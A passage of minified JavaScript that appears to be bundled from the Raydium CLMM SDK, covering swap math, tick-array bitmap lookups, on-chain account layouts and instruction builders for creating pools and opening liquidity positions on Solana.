        for (; !g.amountSpecifiedRemaining.eq(GB) && !g.sqrtPriceX64.eq(h); ) {
          let a = {};
          a.sqrtPriceStartX64 = g.sqrtPriceX64;
          let u,
            l = HC.nextInitTick(w, g.tick, c, i, b) || null,
            d = null;
          if (null == l || !l.liquidityGross.gtn(0)) {
            let s = NC.nextInitializedTickArrayStartIndex(
              {
                tickCurrent: g.tick,
                tickSpacing: c,
                tickArrayBitmap: r,
                exBitmapInfo: o,
              },
              y,
              i
            );
            if (!s.isExist) {
              if (p)
                return {
                  allTrade: !1,
                  amountSpecifiedRemaining: g.amountSpecifiedRemaining,
                  amountCalculated: g.amountCalculated,
                  feeAmount: g.feeAmount,
                  sqrtPriceX64: g.sqrtPriceX64,
                  liquidity: g.liquidity,
                  tickCurrent: g.tick,
                  accounts: g.accounts,
                };
              throw Error("swapCompute LiquidityInsufficient");
            }
            y = s.nextStartIndex;
            let { publicKey: a } = AC(t, e, y);
            (d = a), (w = n[y]);
            try {
              l = HC.firstInitializedTick(w, i);
            } catch {
              throw Error("not found next tick info");
            }
          }
          if (
            ((a.tickNext = l.tick),
            (a.initialized = l.liquidityGross.gtn(0)),
            f !== y && d && (g.accounts.push(d), (f = y)),
            a.tickNext < QB
              ? (a.tickNext = QB)
              : a.tickNext > $B && (a.tickNext = $B),
            (a.sqrtPriceNextX64 = KC.getSqrtPriceX64FromTick(a.tickNext)),
            (u =
              (i && a.sqrtPriceNextX64.lt(h)) ||
              (!i && a.sqrtPriceNextX64.gt(h))
                ? h
                : a.sqrtPriceNextX64),
            ([g.sqrtPriceX64, a.amountIn, a.amountOut, a.feeAmount] =
              jC.swapStepCompute(
                g.sqrtPriceX64,
                u,
                g.liquidity,
                g.amountSpecifiedRemaining,
                s,
                i
              )),
            (g.feeAmount = g.feeAmount.add(a.feeAmount)),
            m
              ? ((g.amountSpecifiedRemaining = g.amountSpecifiedRemaining.sub(
                  a.amountIn.add(a.feeAmount)
                )),
                (g.amountCalculated = g.amountCalculated.sub(a.amountOut)))
              : ((g.amountSpecifiedRemaining = g.amountSpecifiedRemaining.add(
                  a.amountOut
                )),
                (g.amountCalculated = g.amountCalculated.add(
                  a.amountIn.add(a.feeAmount)
                ))),
            g.sqrtPriceX64.eq(a.sqrtPriceNextX64))
          ) {
            if (a.initialized) {
              let t = l.liquidityNet;
              i && (t = t.mul(HB)), (g.liquidity = FC.addDelta(g.liquidity, t));
            }
            (b = a.tickNext != g.tick && !i && w.startTickIndex === a.tickNext),
              (g.tick = i ? a.tickNext - 1 : a.tickNext);
          } else if (g.sqrtPriceX64 != a.sqrtPriceStartX64) {
            let t = KC.getTickFromSqrtPriceX64(g.sqrtPriceX64);
            (b = t != g.tick && !i && w.startTickIndex === t), (g.tick = t);
          }
        }
        try {
          let { nextStartIndex: n, isExist: s } = RC.nextInitializedTickArray(
            g.tick,
            c,
            i,
            r,
            o
          );
          s && f !== n && (g.accounts.push(AC(t, e, n).publicKey), (f = n));
        } catch {}
        return {
          allTrade: !0,
          amountSpecifiedRemaining: GB,
          amountCalculated: g.amountCalculated,
          feeAmount: g.feeAmount,
          sqrtPriceX64: g.sqrtPriceX64,
          liquidity: g.liquidity,
          tickCurrent: g.tick,
          accounts: g.accounts,
        };
      }
      static swapStepCompute(t, e, n, r, o, i) {
        let s = {
            sqrtPriceX64Next: new Yn(0),
            amountIn: new Yn(0),
            amountOut: new Yn(0),
            feeAmount: new Yn(0),
          },
          a = r.gte(GB);
        if (a) {
          let a = UC.mulDivFloor(r, oC.sub(new Yn(o.toString())), oC);
          (s.amountIn = i
            ? FC.getTokenAmountAFromLiquidity(e, t, n, !0)
            : FC.getTokenAmountBFromLiquidity(t, e, n, !0)),
            a.gte(s.amountIn)
              ? (s.sqrtPriceX64Next = e)
              : (s.sqrtPriceX64Next = KC.getNextSqrtPriceX64FromInput(
                  t,
                  n,
                  a,
                  i
                ));
        } else
          (s.amountOut = i
            ? FC.getTokenAmountBFromLiquidity(e, t, n, !1)
            : FC.getTokenAmountAFromLiquidity(t, e, n, !1)),
            r.mul(HB).gte(s.amountOut)
              ? (s.sqrtPriceX64Next = e)
              : (s.sqrtPriceX64Next = KC.getNextSqrtPriceX64FromOutput(
                  t,
                  n,
                  r.mul(HB),
                  i
                ));
        let u = e.eq(s.sqrtPriceX64Next);
        return (
          i
            ? ((u && a) ||
                (s.amountIn = FC.getTokenAmountAFromLiquidity(
                  s.sqrtPriceX64Next,
                  t,
                  n,
                  !0
                )),
              (u && !a) ||
                (s.amountOut = FC.getTokenAmountBFromLiquidity(
                  s.sqrtPriceX64Next,
                  t,
                  n,
                  !1
                )))
            : ((s.amountIn =
                u && a
                  ? s.amountIn
                  : FC.getTokenAmountBFromLiquidity(
                      t,
                      s.sqrtPriceX64Next,
                      n,
                      !0
                    )),
              (s.amountOut =
                u && !a
                  ? s.amountOut
                  : FC.getTokenAmountAFromLiquidity(
                      t,
                      s.sqrtPriceX64Next,
                      n,
                      !1
                    ))),
          !a && s.amountOut.gt(r.mul(HB)) && (s.amountOut = r.mul(HB)),
          a && !s.sqrtPriceX64Next.eq(e)
            ? (s.feeAmount = r.sub(s.amountIn))
            : (s.feeAmount = UC.mulDivCeil(
                s.amountIn,
                new Yn(o),
                oC.sub(new Yn(o))
              )),
          [s.sqrtPriceX64Next, s.amountIn, s.amountOut, s.feeAmount]
        );
      }
    },
    GC = 60,
    VC = 512,
    HC = class {
      static getTickArrayAddressByTick(t, e, n, r) {
        let o = HC.getTickArrayStartIndexByTick(n, r),
          { publicKey: i } = AC(t, e, o);
        return i;
      }
      static getTickOffsetInArray(t, e) {
        if (t % e != 0) throw new Error("tickIndex % tickSpacing not equal 0");
        let n = HC.getTickArrayStartIndexByTick(t, e),
          r = Math.floor((t - n) / e);
        if (r < 0 || r >= GC) throw new Error("tick offset in array overflow");
        return r;
      }
      static getTickArrayBitIndex(t, e) {
        let n = RC.tickCount(e),
          r = t / n;
        return (r = t < 0 && t % n != 0 ? Math.ceil(r) - 1 : Math.floor(r)), r;
      }
      static getTickArrayStartIndexByTick(t, e) {
        return this.getTickArrayBitIndex(t, e) * RC.tickCount(e);
      }
      static getTickArrayOffsetInBitmapByTick(t, e) {
        let n = e * GC,
          r = Math.floor(t / n) + 512;
        return Math.abs(r);
      }
      static checkTickArrayIsInitialized(t, e, n) {
        let r = n * GC,
          o = Math.floor(e / r) + 512,
          i = Math.abs(o);
        return { isInitialized: t.testn(i), startIndex: (i - 512) * r };
      }
      static getNextTickArrayStartIndex(t, e, n) {
        return n ? t - e * GC : t + e * GC;
      }
      static mergeTickArrayBitmap(t) {
        let e = new Yn(0);
        for (let n = 0; n < t.length; n++) e = e.add(t[n].shln(64 * n));
        return e;
      }
      static getInitializedTickArrayInRange(t, e, n, r, o) {
        let i = Math.floor(r / (n * GC));
        return [
          ...HC.searchLowBitFromStart(t, e, i - 1, o, n),
          ...HC.searchHightBitFromStart(t, e, i, o, n),
        ];
      }
      static getAllInitializedTickArrayStartIndex(t, e, n) {
        return HC.searchHightBitFromStart(t, e, -7680, VC, n);
      }
      static getAllInitializedTickArrayInfo(t, e, n, r, o) {
        let i = [],
          s = HC.getAllInitializedTickArrayStartIndex(n, r, o);
        for (let a of s) {
          let { publicKey: n } = AC(t, e, a);
          i.push({ tickArrayStartIndex: a, tickArrayAddress: n });
        }
        return i;
      }
      static getAllInitializedTickInTickArray(t) {
        return t.ticks.filter((t) => t.liquidityGross.gtn(0));
      }
      static searchLowBitFromStart(t, e, n, r, o) {
        let i = [
            ...[...e.negativeTickArrayBitmap].reverse(),
            t.slice(0, 8),
            t.slice(8, 16),
            ...e.positiveTickArrayBitmap,
          ].map((t) => HC.mergeTickArrayBitmap(t)),
          s = [];
        for (; n >= -7680; ) {
          let t = (n + 7680) % 512;
          if (
            (i[Math.floor((n + 7680) / 512)].testn(t) && s.push(n),
            n--,
            s.length === r)
          )
            break;
        }
        let a = RC.tickCount(o);
        return s.map((t) => t * a);
      }
      static searchHightBitFromStart(t, e, n, r, o) {
        let i = [
            ...[...e.negativeTickArrayBitmap].reverse(),
            t.slice(0, 8),
            t.slice(8, 16),
            ...e.positiveTickArrayBitmap,
          ].map((t) => HC.mergeTickArrayBitmap(t)),
          s = [];
        for (; n < 7680; ) {
          let t = (n + 7680) % 512;
          if (
            (i[Math.floor((n + 7680) / 512)].testn(t) && s.push(n),
            n++,
            s.length === r)
          )
            break;
        }
        let a = RC.tickCount(o);
        return s.map((t) => t * a);
      }
      static checkIsOutOfBoundary(t) {
        return t < QB || t > $B;
      }
      static nextInitTick(t, e, n, r, o) {
        if (RC.getArrayStartIndex(e, n) != t.startTickIndex) return null;
        let i = Math.floor((e - t.startTickIndex) / n);
        if (r)
          for (; i >= 0; ) {
            if (t.ticks[i].liquidityGross.gtn(0)) return t.ticks[i];
            i -= 1;
          }
        else
          for (o || (i += 1); i < GC; ) {
            if (t.ticks[i].liquidityGross.gtn(0)) return t.ticks[i];
            i += 1;
          }
        return null;
      }
      static firstInitializedTick(t, e) {
        if (e) {
          let e = GC - 1;
          for (; e >= 0; ) {
            if (t.ticks[e].liquidityGross.gtn(0)) return t.ticks[e];
            e -= 1;
          }
        } else {
          let e = 0;
          for (; e < GC; ) {
            if (t.ticks[e].liquidityGross.gtn(0)) return t.ticks[e];
            e += 1;
          }
        }
        throw Error(`firstInitializedTick check error: ${t} - ${e}`);
      }
      static _getTickPriceLegacy({ poolInfo: t, tick: e, baseIn: n }) {
        let r = KC.getSqrtPriceX64FromTick(e),
          o = KC.sqrtPriceX64ToPrice(r, t.mintA.decimals, t.mintB.decimals);
        return n
          ? { tick: e, price: o, tickSqrtPriceX64: r }
          : { tick: e, price: new bI(1).div(o), tickSqrtPriceX64: r };
      }
      static _getPriceAndTickLegacy({ poolInfo: t, price: e, baseIn: n }) {
        let r = n ? e : new bI(1).div(e),
          o = WC.getTickWithPriceAndTickspacing(
            r,
            t.ammConfig.tickSpacing,
            t.mintA.decimals,
            t.mintB.decimals
          ),
          i = KC.getSqrtPriceX64FromTick(o),
          s = KC.sqrtPriceX64ToPrice(i, t.mintA.decimals, t.mintB.decimals);
        return n ? { tick: o, price: s } : { tick: o, price: new bI(1).div(s) };
      }
      static getTickPrice({ poolInfo: t, tick: e, baseIn: n }) {
        let r = KC.getSqrtPriceX64FromTick(e),
          o = KC.sqrtPriceX64ToPrice(r, t.mintA.decimals, t.mintB.decimals);
        return n
          ? { tick: e, price: o, tickSqrtPriceX64: r }
          : { tick: e, price: new bI(1).div(o), tickSqrtPriceX64: r };
      }
      static getPriceAndTick({ poolInfo: t, price: e, baseIn: n }) {
        let r = n ? e : new bI(1).div(e),
          o = WC.getTickWithPriceAndTickspacing(
            r,
            t.config.tickSpacing,
            t.mintA.decimals,
            t.mintB.decimals
          ),
          i = KC.getSqrtPriceX64FromTick(o),
          s = KC.sqrtPriceX64ToPrice(i, t.mintA.decimals, t.mintB.decimals);
        return n ? { tick: o, price: s } : { tick: o, price: new bI(1).div(s) };
      }
    },
    ZC = JT([
      RT(8),
      UT("bump"),
      CT("index"),
      jT(""),
      qT("protocolFeeRate"),
      qT("tradeFeeRate"),
      CT("tickSpacing"),
      YT(zT(), 8, ""),
    ]),
    XC = JT([qT("blockTimestamp"), WT("tickCumulative"), YT(zT(), 4)]),
    JC = JT([
      RT(8),
      GT("initialized"),
      zT("recentEpoch"),
      CT("observationIndex"),
      jT("poolId"),
      YT(XC, 100, "observations"),
      YT(zT(), 4),
    ]),
    YC = JT([
      UT("rewardState"),
      zT("openTime"),
      zT("endTime"),
      zT("lastUpdateTime"),
      KT("emissionsPerSecondX64"),
      zT("rewardTotalEmissioned"),
      zT("rewardClaimed"),
      jT("tokenMint"),
      jT("tokenVault"),
      jT("creator"),
      KT("rewardGrowthGlobalX64"),
    ]),
    QC = JT([
      RT(8),
      UT("bump"),
      jT("ammConfig"),
      jT("creator"),
      jT("mintA"),
      jT("mintB"),
      jT("vaultA"),
      jT("vaultB"),
      jT("observationId"),
      UT("mintDecimalsA"),
      UT("mintDecimalsB"),
      CT("tickSpacing"),
      KT("liquidity"),
      KT("sqrtPriceX64"),
      PT("tickCurrent"),
      qT(),
      KT("feeGrowthGlobalX64A"),
      KT("feeGrowthGlobalX64B"),
      zT("protocolFeesTokenA"),
      zT("protocolFeesTokenB"),
      KT("swapInAmountTokenA"),
      KT("swapOutAmountTokenB"),
      KT("swapInAmountTokenB"),
      KT("swapOutAmountTokenA"),
      UT("status"),
      YT(UT(), 7, ""),
      YT(YC, 3, "rewardInfos"),
      YT(zT(), 16, "tickArrayBitmap"),
      zT("totalFeesTokenA"),
      zT("totalFeesClaimedTokenA"),
      zT("totalFeesTokenB"),
      zT("totalFeesClaimedTokenB"),
      zT("fundFeesTokenA"),
      zT("fundFeesTokenB"),
      zT("startTime"),
      YT(zT(), 57, "padding"),
    ]),
    $C = JT([KT("growthInsideLastX64"), zT("rewardAmountOwed")]),
    tE = JT([
      RT(8),
      UT("bump"),
      jT("nftMint"),
      jT("poolId"),
      PT("tickLower"),
      PT("tickUpper"),
      KT("liquidity"),
      KT("feeGrowthInsideLastX64A"),
      KT("feeGrowthInsideLastX64B"),
      zT("tokenFeesOwedA"),
      zT("tokenFeesOwedB"),
      YT($C, 3, "rewardInfos"),
      YT(zT(), 8, ""),
    ]);
  JT([
    RT(8),
    UT("bump"),
    jT("poolId"),
    PT("tickLowerIndex"),
    PT("tickUpperIndex"),
    KT("liquidity"),
    KT("feeGrowthInsideLastX64A"),
    KT("feeGrowthInsideLastX64B"),
    zT("tokenFeesOwedA"),
    zT("tokenFeesOwedB"),
    YT(KT(), 3, "rewardGrowthInside"),
    YT(zT(), 8, ""),
  ]);
  var eE = JT([
      PT("tick"),
      (function (t) {
        return new NT(16, !0, t);
      })("liquidityNet"),
      KT("liquidityGross"),
      KT("feeGrowthOutsideX64A"),
      KT("feeGrowthOutsideX64B"),
      YT(KT(), 3, "rewardGrowthsOutsideX64"),
      YT(qT(), 13, ""),
    ]),
    nE = JT([
      RT(8),
      jT("poolId"),
      PT("startTickIndex"),
      YT(eE, GC, "ticks"),
      UT("initializedTickCount"),
      YT(UT(), 115, ""),
    ]),
    rE = JT([RT(329), YT(jT(), 100, "whitelistMints")]),
    oE = JT([
      RT(8),
      jT("poolId"),
      YT(YT(zT(), 8), 14, "positiveTickArrayBitmap"),
      YT(YT(zT(), 8), 14, "negativeTickArrayBitmap"),
    ]);
  JT([
    zT(),
    UT("bump"),
    jT("owner"),
    jT("poolId"),
    jT("positionId"),
    jT("nftAccount"),
    YT(zT(), 8),
  ]),
    JT([
      RT(8),
      UT("bump"),
      jT("lockOwner"),
      jT("poolId"),
      jT("positionId"),
      jT("nftAccount"),
      jT("lockNftMint"),
      zT("recentEpoch"),
      YT(zT(), 8),
    ]),
    JC.span;
  var iE = PA("Raydium_Clmm"),
    sE = {
      createPool: [233, 146, 209, 142, 207, 104, 64, 188],
      initReward: [95, 135, 192, 196, 242, 129, 230, 68],
      setRewardEmissions: [112, 52, 167, 75, 32, 201, 211, 137],
      openPosition: [77, 184, 74, 214, 112, 86, 241, 199],
      openPositionWithTokenEx: [77, 255, 174, 82, 125, 29, 201, 46],
      closePosition: [123, 134, 81, 0, 49, 68, 98, 98],
      increaseLiquidity: [133, 29, 89, 223, 69, 238, 176, 10],
      decreaseLiquidity: [58, 127, 188, 62, 79, 82, 196, 96],
      swap: [43, 4, 237, 11, 26, 201, 30, 98],
      collectReward: [18, 237, 166, 197, 34, 16, 213, 144],
    },
    aE = [188, 37, 179, 131, 82, 150, 84, 73],
    uE = [16, 72, 250, 198, 14, 162, 212, 19],
    cE = class {
      static createPoolInstruction(t, e, n, r, o, i, s, a, u, c, l, d, f, h) {
        let p = JT([KT("sqrtPriceX64"), zT("zero")]),
          m = [
            { pubkey: n, isSigner: !0, isWritable: !0 },
            { pubkey: r, isSigner: !1, isWritable: !1 },
            { pubkey: e, isSigner: !1, isWritable: !0 },
            { pubkey: i, isSigner: !1, isWritable: !1 },
            { pubkey: u, isSigner: !1, isWritable: !1 },
            { pubkey: s, isSigner: !1, isWritable: !0 },
            { pubkey: c, isSigner: !1, isWritable: !0 },
            { pubkey: o, isSigner: !1, isWritable: !0 },
            { pubkey: d, isSigner: !1, isWritable: !0 },
            { pubkey: a, isSigner: !1, isWritable: !1 },
            { pubkey: l, isSigner: !1, isWritable: !1 },
            { pubkey: Gs.programId, isSigner: !1, isWritable: !1 },
            { pubkey: KI, isSigner: !1, isWritable: !1 },
            ...((null == h
              ? void 0
              : h.map((t) => ({ pubkey: t, isSigner: !1, isWritable: !1 }))) ||
              []),
          ],
          g = dt.alloc(p.span);
        p.encode({ sqrtPriceX64: f, zero: GB }, g);
        let y = dt.from([...sE.createPool, ...g]);
        return new vs({ keys: m, programId: t, data: y });
      }
      static async createPoolInstructions(t) {
        let {
            programId: e,
            owner: n,
            mintA: r,
            mintB: o,
            ammConfigId: i,
            initialPriceX64: s,
            extendMintAccount: a,
          } = t,
          [u, c] = [new Ji(r.address), new Ji(o.address)],
          { publicKey: l } = (function (t, e, n, r) {
            return f_([fC, e.toBuffer(), n.toBuffer(), r.toBuffer()], t);
          })(e, i, u, c),
          { publicKey: d } = (function (t, e) {
            return f_([bC, e.toBuffer()], t);
          })(e, l),
          { publicKey: f } = vC(e, l, u),
          { publicKey: h } = vC(e, l, c),
          p = TC(e, l).publicKey;
        return {
          signers: [],
          instructions: [
            this.createPoolInstruction(
              e,
              l,
              n,
              i,
              d,
              u,
              f,
              new Ji(r.programId || Bc),
              c,
              h,
              new Ji(o.programId || Bc),
              p,
              s,
              a
            ),
          ],
          instructionTypes: [hS, AS],
          address: {
            poolId: l,
            observationId: d,
            exBitmapAccount: p,
            mintAVault: f,
            mintBVault: h,
          },
          lookupTableAddress: [],
        };
      }
      static openPositionFromLiquidityInstruction(
        t,
        e,
        n,
        r,
        o,
        i,
        s,
        a,
        u,
        c,
        l,
        d,
        f,
        h,
        p,
        m,
        g,
        y,
        w,
        b,
        v,
        A,
        k,
        I,
        S,
        _
      ) {
        let T = JT([
            PT("tickLowerIndex"),
            PT("tickUpperIndex"),
            PT("tickArrayLowerStartIndex"),
            PT("tickArrayUpperStartIndex"),
            KT("liquidity"),
            zT("amountMaxA"),
            zT("amountMaxB"),
            GT("withMetadata"),
            UT("optionBaseFlag"),
            GT("baseFlag"),
          ]),
          B = [...(_ ? [{ pubkey: _, isSigner: !1, isWritable: !0 }] : [])],
          C = [
            { pubkey: e, isSigner: !0, isWritable: !0 },
            { pubkey: r, isSigner: !1, isWritable: !1 },
            { pubkey: o, isSigner: !0, isWritable: !0 },
            { pubkey: i, isSigner: !1, isWritable: !0 },
            { pubkey: s, isSigner: !1, isWritable: !0 },
            { pubkey: n, isSigner: !1, isWritable: !0 },
            { pubkey: a, isSigner: !1, isWritable: !0 },
            { pubkey: u, isSigner: !1, isWritable: !0 },
            { pubkey: c, isSigner: !1, isWritable: !0 },
            { pubkey: l, isSigner: !1, isWritable: !0 },
            { pubkey: d, isSigner: !1, isWritable: !0 },
            { pubkey: f, isSigner: !1, isWritable: !0 },
            { pubkey: h, isSigner: !1, isWritable: !0 },
            { pubkey: p, isSigner: !1, isWritable: !0 },
            { pubkey: KI, isSigner: !1, isWritable: !1 },
            { pubkey: Gs.programId, isSigner: !1, isWritable: !1 },
            { pubkey: Bc, isSigner: !1, isWritable: !1 },
            { pubkey: Ec, isSigner: !1, isWritable: !1 },
            { pubkey: FI, isSigner: !1, isWritable: !1 },
            { pubkey: Cc, isSigner: !1, isWritable: !1 },
            { pubkey: m, isSigner: !1, isWritable: !1 },
            { pubkey: g, isSigner: !1, isWritable: !1 },
            ...B,
          ],
          E = dt.alloc(T.span);
        T.encode(
          {
            tickLowerIndex: y,
            tickUpperIndex: w,
            tickArrayLowerStartIndex: b,
            tickArrayUpperStartIndex: v,
            liquidity: A,
            amountMaxA: k,
            amountMaxB: I,
            withMetadata: "create" === S,
            baseFlag: !1,
            optionBaseFlag: 0,
          },
          E
        );
        let x = dt.from([...sE.openPosition, ...E]);
        return new vs({ keys: C, programId: t, data: x });
      }
      static openPositionFromLiquidityInstruction22(
        t,
        e,
        n,
        r,
        o,
        i,
        s,
        a,
        u,
        c,
        l,
        d,
        f,
        h,
        p,
        m,
        g,
        y,
        w,
        b,
        v,
        A,
        k,
        I,
        S
      ) {
        let _ = JT([
            PT("tickLowerIndex"),
            PT("tickUpperIndex"),
            PT("tickArrayLowerStartIndex"),
            PT("tickArrayUpperStartIndex"),
            KT("liquidity"),
            zT("amountMaxA"),
            zT("amountMaxB"),
            GT("withMetadata"),
            UT("optionBaseFlag"),
            GT("baseFlag"),
          ]),
          T = [...(S ? [{ pubkey: S, isSigner: !1, isWritable: !0 }] : [])],
          B = [
            { pubkey: e, isSigner: !0, isWritable: !0 },
            { pubkey: r, isSigner: !1, isWritable: !1 },
            { pubkey: o, isSigner: !0, isWritable: !0 },
            { pubkey: i, isSigner: !1, isWritable: !0 },
            { pubkey: n, isSigner: !1, isWritable: !0 },
            { pubkey: s, isSigner: !1, isWritable: !0 },
            { pubkey: a, isSigner: !1, isWritable: !0 },
            { pubkey: u, isSigner: !1, isWritable: !0 },
            { pubkey: c, isSigner: !1, isWritable: !0 },
            { pubkey: l, isSigner: !1, isWritable: !0 },
            { pubkey: d, isSigner: !1, isWritable: !0 },
            { pubkey: f, isSigner: !1, isWritable: !0 },
            { pubkey: h, isSigner: !1, isWritable: !0 },
            { pubkey: KI, isSigner: !1, isWritable: !1 },
            { pubkey: Gs.programId, isSigner: !1, isWritable: !1 },
            { pubkey: Bc, isSigner: !1, isWritable: !1 },
            { pubkey: Ec, isSigner: !1, isWritable: !1 },
            { pubkey: Cc, isSigner: !1, isWritable: !1 },
            { pubkey: p, isSigner: !1, isWritable: !1 },
            { pubkey: m, isSigner: !1, isWritable: !1 },
            ...T,
          ],
          C = dt.alloc(_.span);
        _.encode(
          {
            tickLowerIndex: g,
            tickUpperIndex: y,
            tickArrayLowerStartIndex: w,
            tickArrayUpperStartIndex: b,
            liquidity: v,
            amountMaxA: A,
            amountMaxB: k,
            withMetadata: "create" === I,
            baseFlag: !1,
            optionBaseFlag: 0,
          },
          C
        );
        let E = dt.from([...sE.openPositionWithTokenEx, ...C]);
        return new vs({ keys: B, programId: t, data: E });
      }
      static async openPositionInstructions({
        poolInfo: t,
        poolKeys: e,
        ownerInfo: n,
        tickLower: r,
        tickUpper: o,
        liquidity: i,
        amountMaxA: s,
        amountMaxB: a,
        withMetadata: u,
        getEphemeralSigners: c,
        nft2022: l,
      }) {
        let d,
          f = [],
          [h, p] = [new Ji(t.programId), new Ji(t.id)];
        if (c) d = new Ji((await c(1))[0]);
        else {
          let t = Xu.generate();
          f.push(t), (d = t.publicKey);
        }
        let m = HC.getTickArrayStartIndexByTick(r, t.config.tickSpacing),
          g = HC.getTickArrayStartIndexByTick(o, t.config.tickSpacing),
          { publicKey: y } = AC(h, p, m),
          { publicKey: w } = AC(h, p, g),
          { publicKey: b } = y_(n.wallet, d, l ? Cc : Bc),
          { publicKey: v } = SC(d),
          { publicKey: A } = IC(h, d),
          { publicKey: k } = kC(h, p, r, o);
        return {
          signers: f,
          instructions: [
            l
              ? this.openPositionFromLiquidityInstruction22(
                  h,
                  n.feePayer,
                  p,
                  n.wallet,
                  d,
                  b,
                  k,
                  y,
                  w,
                  A,
                  n.tokenAccountA,
                  n.tokenAccountB,
                  new Ji(e.vault.A),
                  new Ji(e.vault.B),
                  new Ji(t.mintA.address),
                  new Ji(t.mintB.address),
                  r,
                  o,
                  m,
                  g,
                  i,
                  s,
                  a,
                  u,
                  NC.isOverflowDefaultTickarrayBitmap(t.config.tickSpacing, [
                    m,
                    g,
                  ])
                    ? TC(h, p).publicKey
                    : void 0
                )
              : this.openPositionFromLiquidityInstruction(
                  h,
                  n.feePayer,
                  p,
                  n.wallet,
                  d,
                  b,
                  v,
                  k,
                  y,
                  w,
                  A,
                  n.tokenAccountA,
                  n.tokenAccountB,
                  new Ji(e.vault.A),
                  new Ji(e.vault.B),
                  new Ji(t.mintA.address),
                  new Ji(t.mintB.address),
                  r,
                  o,
                  m,
                  g,
                  i,
                  s,
                  a,
                  u,
                  NC.isOverflowDefaultTickarrayBitmap(t.config.tickSpacing, [
                    m,
                    g,
                  ])
                    ? TC(h, p).publicKey
                    : void 0
                ),
          ],
          instructionTypes: [kS],
          lookupTableAddress: e.lookupTableAccount
            ? [e.lookupTableAccount]
            : [],
          address: {
            nftMint: d,
            tickArrayLower: y,
            tickArrayUpper: w,
            positionNftAccount: b,
            metadataAccount: v,
            personalPosition: A,
            protocolPosition: k,
          },
        };
      }
      static async openPositionFromBaseInstructions({
        poolInfo: t,
        poolKeys: e,
        ownerInfo: n,
        tickLower: r,
        tickUpper: o,
        base: i,
        baseAmount: s,
        otherAmountMax: a,
        withMetadata: u,
        getEphemeralSigners: c,
        nft2022: l,
      }) {
        let d,
          f = [],
          [h, p] = [new Ji(t.programId), new Ji(t.id)];
        if (c) d = new Ji((await c(1))[0]);
        else {
          let t = Xu.generate();
          f.push(t), (d = t.publicKey);
        }
        let m = HC.getTickArrayStartIndexByTick(r, t.config.tickSpacing),
          g = HC.getTickArrayStartIndexByTick(o, t.config.tickSpacing),
          { publicKey: y } = AC(h, p, m),
          { publicKey: w } = AC(h, p, g),
          { publicKey: b } = y_(n.wallet, d, l ? Cc : Bc),
          { publicKey: v } = SC(d),
          { publicKey: A } = IC(h, d),
          { publicKey: k } = kC(h, p, r, o);
        return {
          address: {
            nftMint: d,
            tickArrayLower: y,
            tickArrayUpper: w,
            positionNftAccount: b,
            metadataAccount: v,
            personalPosition: A,
            protocolPosition: k,
          },
          instructions: [
            l
              ? this.openPositionFromBaseInstruction22(
                  h,
                  n.feePayer,
                  p,
                  n.wallet,
                  d,
                  b,
                  k,
                  y,
                  w,
                  A,
                  n.tokenAccountA,
                  n.tokenAccountB,
                  new Ji(e.vault.A),
                  new Ji(e.vault.B),
                  new Ji(t.mintA.address),
                  new Ji(t.mintB.address),
                  r,
                  o,
                  m,
                  g,
                  u,
                  i,
                  s,
                  a,
                  NC.isOverflowDefaultTickarrayBitmap(t.config.tickSpacing, [
                    m,
                    g,
                  ])
                    ? TC(h, p).publicKey
                    : void 0
                )
              : this.openPositionFromBaseInstruction(
                  h,
                  n.feePayer,
                  p,
                  n.wallet,
                  d,
                  b,
                  v,
                  k,
                  y,
                  w,
                  A,
                  n.tokenAccountA,
                  n.tokenAccountB,
                  new Ji(e.vault.A),
                  new Ji(e.vault.B),
                  new Ji(t.mintA.address),
                  new Ji(t.mintB.address),
                  r,
                  o,
                  m,
                  g,
                  u,
                  i,
                  s,
                  a,
                  NC.isOverflowDefaultTickarrayBitmap(t.config.tickSpacing, [
                    m,
                    g,
                  ])
                    ? TC(h, p).publicKey
                    : void 0
                ),
          ],
          signers: f,
          instructionTypes: [kS],
          lookupTableAddress: e.lookupTableAccount
            ? [e.lookupTableAccount]
            : [],
        };
      }
      static openPositionFromBaseInstruction(
        t,
        e,
        n,
        r,
        o,
        i,
        s,
        a,
        u,
        c,
        l,
        d,
        f,
        h,
        p,
        m,
        g,
        y,
        w,
        b,
        v,
        A,
        k,
        I,
        S,
        _
      ) {
        let T = JT([
            PT("tickLowerIndex"),
            PT("tickUpperIndex"),
            PT("tickArrayLowerStartIndex"),
            PT("tickArrayUpperStartIndex"),
            KT("liquidity"),
            zT("amountMaxA"),
            zT("amountMaxB"),
            GT("withMetadata"),
            UT("optionBaseFlag"),
            GT("baseFlag"),
          ]),
          B = [...(_ ? [{ pubkey: _, isSigner: !1, isWritable: !0 }] : [])],
          C = [
            { pubkey: e, isSigner: !0, isWritable: !0 },
            { pubkey: r, isSigner: !1, isWritable: !1 },
            { pubkey: o, isSigner: !0, isWritable: !0 },
            { pubkey: i, isSigner: !1, isWritable: !0 },
            { pubkey: s, isSigner: !1, isWritable: !0 },
            { pubkey: n, isSigner: !1, isWritable: !0 },
            { pubkey: a, isSigner: !1, isWritable: !0 },
            { pubkey: u, isSigner: !1, isWritable: !0 },
            { pubkey: c, isSigner: !1, isWritable: !0 },
            { pubkey: l, isSigner: !1, isWritable: !0 },
            { pubkey: d, isSigner: !1, isWritable: !0 },
            { pubkey: f, isSigner: !1, isWritable: !0 },
            { pubkey: h, isSigner: !1, isWritable: !0 },
            { pubkey: p, isSigner: !1, isWritable: !0 },
            { pubkey: KI, isSigner: !1, isWritable: !1 },
            { pubkey: Gs.programId, isSigner: !1, isWritable: !1 },
            { pubkey: Bc, isSigner: !1, isWritable: !1 },
            { pubkey: Ec, isSigner: !1, isWritable: !1 },
            { pubkey: FI, isSigner: !1, isWritable: !1 },
            { pubkey: Cc, isSigner: !1, isWritable: !1 },
            { pubkey: m, isSigner: !1, isWritable: !1 },
            { pubkey: g, isSigner: !1, isWritable: !1 },
            ...B,
          ],
          E = dt.alloc(T.span);
        T.encode(
          {
            tickLowerIndex: y,
            tickUpperIndex: w,
            tickArrayLowerStartIndex: b,
            tickArrayUpperStartIndex: v,
            liquidity: new Yn(0),
            amountMaxA: "MintA" === k ? I : S,
            amountMaxB: "MintA" === k ? S : I,
            withMetadata: "create" === A,
            baseFlag: "MintA" === k,
            optionBaseFlag: 1,
          },
          E
        );
        let x = dt.from([...sE.openPosition, ...E]);
        return new vs({ keys: C, programId: t, data: x });
      }
      static openPositionFromBaseInstruction22(
        t,
        e,
        n,
        r,
        o,
        i,
        s,
        a,
        u,
        c,
        l,
        d,
        f,
        h,
        p,
        m,
        g,
        y,
        w,
        b,
        v,
        A,
        k,
        I,
        S
      ) {
        let _ = JT([
            PT("tickLowerIndex"),
            PT("tickUpperIndex"),
